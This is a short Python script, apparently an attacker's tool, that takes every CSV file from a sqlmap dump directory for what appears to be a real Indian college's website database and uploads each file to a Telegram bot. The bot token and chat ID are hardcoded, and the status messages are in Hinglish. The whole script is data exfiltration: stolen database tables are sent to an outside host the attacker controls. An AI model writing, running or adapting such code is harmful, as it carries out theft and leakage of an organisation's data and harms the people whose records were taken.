import os
import requests

API_TOKEN = "7930452267:AAHfMaFUV6lCS9JhmxUsnA6PEGahLIdEeVI"
CHAT_ID = "7273248790"
DIR = ".local/share/sqlmap/output/www.kulticollege.ac.in/dump/kulticollegeac_website_new"

def send_file(file_path):
    url = f"https://api.telegram.org/bot{API_TOKEN}/sendDocument"
    with open(file_path, "rb") as f:
        files = {"document": f}
        data = {"chat_id": CHAT_ID}
        response = requests.post(url, data=data, files=files)
    return response

def main():
    if not os.path.isdir(DIR):
        print(f"Directory '{DIR}' nahi mili")
        return

    files_sent = 0
    for filename in os.listdir(DIR):
        if filename.endswith(".csv"):
            file_path = os.path.join(DIR, filename)
            resp = send_file(file_path)
            if resp.status_code == 200:
                print(f"File sent: {filename}")
                files_sent += 1
            else:
                print(f"Failed to send {filename}: {resp.text}")

    if files_sent == 0:
        print("Koi CSV file nahi mili")

if __name__ == "__main__":
    main()
